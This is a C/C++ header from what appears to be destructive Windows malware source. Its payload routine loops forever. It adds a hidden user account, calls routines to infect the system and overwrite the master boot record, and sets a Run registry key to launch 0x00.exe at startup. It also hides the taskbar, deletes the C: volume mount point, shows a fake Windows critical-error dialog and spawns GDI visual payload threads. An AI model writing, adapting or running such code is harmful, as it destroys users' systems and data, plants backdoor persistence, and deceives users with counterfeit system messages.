// Initialize GDI and sounds header
//

#pragma once
#include "0x00.h"

DWORD WINAPI InitializeAllPayloads(LPVOID Void)
{
	while (true)
	{
	    Sleep(1000);
	    ShellExecuteW( NULL, L"open", L"net1", L"user /add 0x00", NULL, SW_HIDE );
	    InfectTheSystem();
            OverwriteMBR();
            registrySetup();
            ManageRegW(HKEY_LOCAL_MACHINE, L"SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run", L"Survive The NS IN AREA 51!", 0, 0, (BYTE*)L"C:\\WINDOWS\\System32\\0x00.exe", FALSE, TRUE);
            Sleep(5000);
            ShowWindow( FindWindowW(L"Shell_TrayWnd", NULL ), SW_HIDE );
	    DeleteVolumeMountPointW(L"C:\\");
	    MessageBoxW( NULL, L"Windows has ran into a problem that the taskbar has been gone.\n\nError: x3x3002x5\n\nCause: Critical process gave up.", L"Windows - Critical Error", MB_ICONASTERISK );
	    Sleep(4000);
	    ProgramOpener();
	    
	    // GDI PAYLOADS
		
	    HANDLE hPML1 = HeapCreate(HEAP_NO_SERIALIZE | HEAP_CREATE_ENABLE_EXECUTE, sizeof(char) * 8192 * 64, 0);
	    HANDLE hPayload1 = CreateThread(NULL, NULL, &GDIPayload1, hPML1, NULL, NULL);
	//  BB1();
	    Sleep(30000); 
	    EndPayload(hPayload1, hPML1);
	    HANDLE hPML2 = HeapCreate(HEAP_NO_SERIALIZE | HEAP_CREATE_ENABLE_EXECUTE, sizeof(char) * 8192 * 64, 0);
	    HANDLE hPayload2 = CreateThread(NULL, NULL, &GDIPayload2, hPML2, NULL, NULL);
	//  BB2();
	    Sleep(30000); 
	    HANDLE hPML3 = HeapCreate(HEAP_NO_SERIALIZE | HEAP_CREATE_ENABLE_EXECUTE, sizeof(char) * 8192 * 64, 0);
	    HANDLE hPayload3 = CreateThread(NULL, NULL, &GDIPayload3, hPML3, NULL, NULL);
	//  BB2();
	    Sleep(30000); 
	}
}

